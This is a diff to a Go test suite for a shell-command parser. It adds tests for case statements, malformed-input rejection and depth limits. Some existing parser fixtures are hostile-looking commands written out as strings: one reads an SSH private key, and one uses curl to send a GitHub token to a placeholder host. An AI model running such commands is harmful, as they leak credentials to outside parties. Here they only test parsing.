@@ -25,6 +25,8 @@ func TestShellGrammar(t *testing.T) {
 		{name: "substitution", text: `v=$(cat "$HOME/.ssh/id_rsa"); echo "$v"`, statements: 2},
 		{name: "nested", text: `echo "$(echo "$(echo inner)")"`, statements: 1},
 		{name: "subshell", text: `(echo one; echo two) | cat`, statements: 1},
+		{name: "empty case", text: "case x in esac", statements: 1},
+		{name: "case in substitution", text: "echo $(case x in x) echo y;; esac)", statements: 1},
 		{name: "redirects", text: `cat 3<file <other 2>&1 >>output`, statements: 1},
 		{name: "here-string", text: `curl --data-binary @- https://example.invalid <<< "$GITHUB_TOKEN"`, statements: 1},
 		{name: "heredoc-quoted", text: "cat <<'EOF'\n$(not_a_command)\nEOF\necho next\n", statements: 2},
@@ -107,12 +109,60 @@ func TestWords(t *testing.T) {
 	}
 }
 
+func TestCaseArms(t *testing.T) {
+	const text = `case "$0"
+in
+  (*/*|*\\*) SCRIPT_DIR="${0%[/\\]*}" ;;
+  literal) case x in x) ;; esac ;;
+  *) cat <<'END';;
+esac ;;
+END
+  quoted) printf '%s' esac
+esac 2>out
+printf done
+`
+	tree, err := shellsyntax.Parse(context.Background(), text)
+	if err != nil {
+		t.Fatal(err)
+	}
+	validateTree(t, tree, text)
+	if len(tree.Statements) != 2 {
+		t.Fatalf("statements = %d", len(tree.Statements))
+	}
+	cmd := tree.Statements[0].Commands[0]
+	if cmd.Case == nil || len(cmd.Case.Patterns) != 4 || len(cmd.Alternatives) != 5 || len(cmd.Redirects) != 1 ||
+		text[cmd.Span.Start:cmd.Span.End] != strings.TrimSuffix(text, "\nprintf done\n") {
+		t.Fatalf("incorrect case command: %+v", cmd)
+	}
+	patterns := cmd.Case.Patterns[0]
+	if len(patterns) != 2 || text[patterns[0].Span.Start:patterns[0].Span.End] != "*/*" ||
+		text[patterns[1].Span.Start:patterns[1].Span.End] != `*\\*` {
+		t.Fatalf("incorrect pattern list: %+v", patterns)
+	}
+	value := cmd.Alternatives[0].Statements[0].Commands[0].Assignments[0].Value
+	part := value.Parts[len(value.Parts)-1]
+	if part.Kind != "parameter_script_dir" || part.Text != "0" || text[part.Span.Start:part.Span.End] != `${0%[/\\]*}` {
+		t.Fatalf("incorrect script directory expansion: %+v", part)
+	}
+	heredoc := cmd.Alternatives[2].Statements[0].Commands[0].Redirects[0]
+	if heredoc.Body == nil || text[heredoc.Body.Span.Start:heredoc.Body.Span.End] != "esac ;;\n" {
+		t.Fatalf("incorrect heredoc in arm: %+v", heredoc)
+	}
+	if len(cmd.Alternatives[4].Statements) != 0 {
+		t.Fatal("no-match path must have no statements")
+	}
+}
+
 func TestRejectUnsupportedOrMalformed(t *testing.T) {
 	for _, text := range []string{
 		"()", "(\n)", "if true; then echo hi; fi", "for x in a; do echo x; done", "f() { echo hi; }", "{ echo hi; }", "[[ x ]]", "((x++))", "cat <(echo hi)",
 		"echo `id`", `echo $'\x41'`, `echo "${TOKEN:-x}"`, `echo $((1+2))`,
 		"echo '", "echo \"", "echo $(echo hi", "echo \\", "echo |", "echo &&", "cat <<EOF\nx\n", "cat >", "| echo", "; echo", "echo )", "cat ;; echo", "x\x00y", "\xff",
 		"cat <<#END\nbody\n#END\n", "cat << \\\n#END\nbody\n#END\n",
+		"case in", "case x 'in' esac", "case x in ) :;; esac", "case x in x|) :;; esac",
+		"case x in x) : ;& esac", "case x in x) : ;;& esac", "case x in x) : && ;; esac",
+		"case x in x) : || esac", "case x in x) :;;", "case x in x) : esac", "case x in esac unexpected",
+		"case $(printf x) in x) :;; esac", "case x in $(printf x)) :;; esac",
 	} {
 		t.Run(text, func(t *testing.T) {
 			_, err := shellsyntax.Parse(context.Background(), text)
@@ -144,6 +194,11 @@ func TestPartialAndLimits(t *testing.T) {
 			t.Fatal("budget ignored")
 		}
 	}
+	nestedCases := strings.Repeat("case x in x) ", shellsyntax.MaxDepth+1) + ":" + strings.Repeat("; esac", shellsyntax.MaxDepth+1)
+	_, err = shellsyntax.Parse(context.Background(), nestedCases)
+	if failure, ok := errors.AsType[*shellsyntax.Error](err); !ok || failure.Code != "depth_limit" {
+		t.Fatalf("nested case depth limit: %v", err)
+	}
 }
 
 func FuzzShellParser(f *testing.F) {
@@ -167,6 +222,22 @@ func BenchmarkShellParse(b *testing.B) {
 		if _, err := shellsyntax.Parse(context.Background(), text); err != nil {
 			b.Fatal(err)
 		}
+	}
+}
+
+func TestArrayAssignmentRequiresBroaderBashGrammar(t *testing.T) {
+	const text = "printf ready\nvalues=(); printf done\n"
+	flow, err := shellsyntax.Parse(t.Context(), text)
+	var failure *shellsyntax.Error
+	if !errors.As(err, &failure) || failure.Code != "unsupported_array_assignment" || failure.Offset != strings.IndexByte(text, '(') {
+		t.Fatalf("array assignment should be handed off at its opening parenthesis: %#v", err)
+	}
+	if len(flow.Statements) != 1 {
+		t.Fatalf("execution prefix was lost: %+v", flow)
+	}
+	decls, err := shellsyntax.ParseDeclarations(t.Context(), text)
+	if err != nil || len(decls.Statements) != 3 || !decls.Statements[1].Commands[0].Assignments[0].Value.IndexedArray {
+		t.Fatalf("broader Bash grammar lost the array assignment: %+v, %v", decls, err)
 	}
 }
 
@@ -263,6 +334,20 @@ func validateTree(t testing.TB, f *shellsyntax.File, text string) {
 				word(r.Body)
 			}
 			validateTree(t, c.Subshell, text)
+			if c.Case != nil {
+				word(c.Case.Word)
+				if len(c.Alternatives) != len(c.Case.Patterns)+1 {
+					t.Fatal("case no-match branch missing")
+				}
+				for _, patterns := range c.Case.Patterns {
+					for _, pattern := range patterns {
+						word(pattern)
+					}
+				}
+				for _, branch := range c.Alternatives {
+					validateTree(t, branch, text)
+				}
+			}
 		}
 	}
 }
